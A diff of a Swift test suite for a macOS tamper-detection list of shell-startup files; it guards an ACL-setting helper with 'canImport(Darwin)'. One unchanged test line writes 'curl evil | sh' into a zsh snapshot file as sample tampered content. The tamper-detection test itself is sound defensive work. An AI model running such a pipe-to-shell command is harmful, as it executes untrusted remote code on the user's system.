@@ -64,12 +64,14 @@ struct MacSealListTests {
         try #require(utimensat(AT_FDCWD, path, &times, 0) == 0)
     }
 
+    #if canImport(Darwin)
     /// An ACL entry added to `path` (`chmod +a`'s, through the ACL calls).
     static func addACL(_ path: String) throws {
         let acl = try #require(acl_from_text("!#acl 1\ngroup:ABCDEFAB-CDEF-ABCD-EFAB-CDEF0000000C:everyone:12:allow:write,append\n"))
         defer { acl_free(UnsafeMutableRawPointer(acl)) }
         try #require(acl_set_file(path, ACL_TYPE_EXTENDED, acl) == 0, "acl_set_file: \(errno)")
     }
+    #endif
 
     /// The list's rows: the home's, the zsh files' sourced ones, and those outside under a scratch root.
     @Test(Self.mac) func theListHasTheMeasuredRows() throws {
@@ -162,7 +164,9 @@ struct MacSealListTests {
                     before = made
                     try #require(chmod(item.path + "/sub", 0o777) == 0)
                 }
+                #if canImport(Darwin)
                 try change(item, "an ACL") { try Self.addACL(item.path) }
+                #endif
             case .entries:
                 try change(item, "created") { try self.write("export A=1\n", item.path + "/snapshot-zsh-1-a.sh") }
                 try change(item, "an entry changed in place") { try self.write("curl evil | sh\n", item.path + "/snapshot-zsh-1-a.sh") }
